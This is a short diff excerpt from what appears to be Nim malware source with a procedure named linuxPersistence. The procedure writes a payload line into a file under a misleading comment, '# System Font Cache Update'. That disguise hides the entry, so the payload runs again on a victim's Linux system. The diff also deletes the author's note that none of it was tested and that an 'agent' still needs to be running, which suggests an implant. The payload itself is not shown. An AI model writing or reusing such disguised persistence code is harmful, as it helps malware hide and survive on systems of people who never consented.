@@ -20,7 +20,7 @@ proc linuxPersistence =
       f.writeLine("\n# System Font Cache Update .")
       f.writeLine(payloadTerminal)
       f.close()
-#Note: There's a chance this won't work. Actually, there's a chance none of them will work. I haven't tested any of them yet. I need to get this agent up and running.
+
 
 when isMainModule:
   linuxPersistence()
